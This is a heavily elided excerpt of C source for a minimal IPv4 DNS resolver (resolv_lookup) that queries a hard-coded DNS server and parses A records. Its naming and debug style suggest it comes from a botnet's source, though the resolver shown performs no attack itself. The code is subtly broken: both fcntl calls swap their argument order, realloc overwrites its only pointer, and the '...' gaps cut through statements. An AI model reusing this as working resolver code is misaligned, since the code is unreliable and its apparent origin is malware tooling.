...
/* Functionality:
Lookup the IP address of domains using DNS.
Only supports IPv4 addresses.
*/

// Local function
static void resolv_skip_name(uint8_t *, uint8_t *, int *);
...
struct resolv_entries *resolv_lookup(char *domain) {
  ...
  if (entries == NULL) {
#ifdef DEBUG
    printf("[resolv] Failed to call calloc()\n");
#endif
    return NULL;
  }

  char query[2048] = {0}, response[2048] = {0};
  ...
  struct dns_question *dnst =
      (struct dns_question *)(qname + strlen(qname) + 1);
  struct sockaddr_in addr = {0};
  int query_len =
      sizeof(struct dnshdr) + strlen(qname) + 1 + sizeof(struct dns_question);
  int tries = 0, fd = -1, i = 0;
  uint16_t dns_id = rand() % 0xffff;

  memset(&addr, 0, sizeof(struct sockaddr_in));
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = RESOLV_DNS_SERVER;
...
#ifdef DEBUG
      printf("[resolv] Failed to send packet, errno %d\n", errno);
#endif
      sleep(1);
      continue;
    }

    if (fcntl(F_SETFL, fd, O_NONBLOCK | fcntl(F_GETFL, fd, 0)) == -1) {
#ifdef DEBUG
      printf("[resolv] Failed to call fcntl, errno %d\n", errno);
#endif
      sleep(1);
      continue;
    }
...
#endif
      int ret =
          recvfrom(fd, response, sizeof(response), MSG_NOSIGNAL, NULL, NULL);
      char *name;
      uint16_t ancount;
      int stop;

      if (ret < (sizeof(struct dnshdr) + strlen(qname) + 1 +
      ...
      while (ancount-- > 0) {
        ...
        if (r_data->type == htons(PROTO_DNS_QTYPE_A) &&
          ...
          if (ntohs(r_data->data_len) == 4) {
            ...
            entries->addrs = realloc(entries->addrs, (entries->addrs_len + 1) *
                                                         sizeof(uint32_t));
            if (entries->addrs == NULL) {
#ifdef DEBUG
              printf("[resolv] Failed to call realloc()\n");
#endif
              return NULL;
            }
            entries->addrs[entries->addrs_len++] = (*p);
#ifdef DEBUG
            printf("[resolv] Found IPv4 address %u.%u.%u.%u\n", (*p) & 0xFF,
                   ((*p) >> 8) & 0xFF, ((*p) >> 16) & 0xFF,
                   ((*p) >> 24) & 0xFF);
#endif
          }
...
#ifdef DEBUG
  printf("[resolv] Resolved %s to %u IPv4 addresses\n", domain,
         entries->addrs_len);
#endif
